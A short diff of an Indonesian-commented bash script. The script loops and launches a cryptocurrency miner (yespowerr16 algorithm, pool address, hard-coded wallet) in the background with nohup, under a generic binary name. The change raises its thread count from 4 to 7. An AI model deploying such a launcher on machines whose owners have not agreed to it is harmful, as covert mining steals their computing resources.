@@ -49,7 +49,7 @@ while true; do
   if [ -f $dynamic_sgr ]; then
     # Menjalankan proses dengan port acak
     port=$(shuf -i 802-810 -n 1)  # Memilih port acak dari 802 hingga 810
-    nohup $dynamic_sgr -a yespowerr16 --pool $ip:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t 4 -p m=solo > dance_$port_$timestamp.log 2>&1 &
+    nohup $dynamic_sgr -a yespowerr16 --pool $ip:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t 7 -p m=solo > dance_$port_$timestamp.log 2>&1 &
     process_pid=$!
 
     echo "Memulai proses dengan PID $process_pid menggunakan IP $ip dan port $port"
